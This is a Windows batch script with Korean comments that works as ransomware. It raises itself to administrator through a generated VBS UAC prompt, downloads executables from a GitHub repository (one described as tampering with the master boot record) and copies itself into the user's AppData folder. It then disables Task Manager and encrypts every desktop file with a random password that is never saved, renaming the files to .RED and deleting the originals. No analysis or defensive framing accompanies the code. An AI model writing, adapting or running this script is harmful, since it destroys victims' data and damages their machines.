@echo off
 >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

 if '%errorlevel%' NEQ '0' (
     goto UACPrompt
 ) else ( goto gotAdmin )

:UACPrompt
     echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
     echo UAC.ShellExecute "%~s0", "", "", "runas", 0 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
     exit /B

:gotAdmin
     if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
     pushd "%CD%"
     CD /D "%~dp0"

if exist "%appdata%\%~n0.bat" goto start

REM 중요 파일 생성
echo please wait...

powershell "(New-Object System.Net.WebClient).DownloadFile('https://github.com/BAtchfiler0/AES_CRYPT/raw/main/GUI.exe','%systemdrive%\GUI.exe')"
powershell "(New-Object System.Net.WebClient).DownloadFile('https://github.com/BAtchfiler0/AES_CRYPT/raw/main/aescrypt.exe','%systemdrive%\aescrypt.exe')"
powershell "(New-Object System.Net.WebClient).DownloadFile('https://github.com/BAtchfiler0/AES_CRYPT/raw/main/Red%%20Crypt%%20MBR.exe','%systemdrive%\Red Crypt MBR.exe')"

REM 파일 복사
copy "%~s0" "%appdata%\%~n0.bat"
start "" "%appdata%\%~n0.bat"
exit

:start
REM MBR 변조
start "" "%systemdrive%\Red Crypt MBR.exe"
REM 비밀번호 설정
set /a pass=%random%

REM 암호화 시작
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system" /v disabletaskmgr /t reg_dword /d 1 /f >nul

cd "%userprofile%\desktop"

For /f "tokens=*" %%A in ('dir /b /s /a-d-h') do (
C:\aescrypt -e -p %pass% "%%~A"
ren "%%~A.aes" "%%~nA%%~xA.RED"
del /f /q "%%~A"
)

REM GUI창 띄우기
start "" "%systemdrive%\GUI.exe"
exit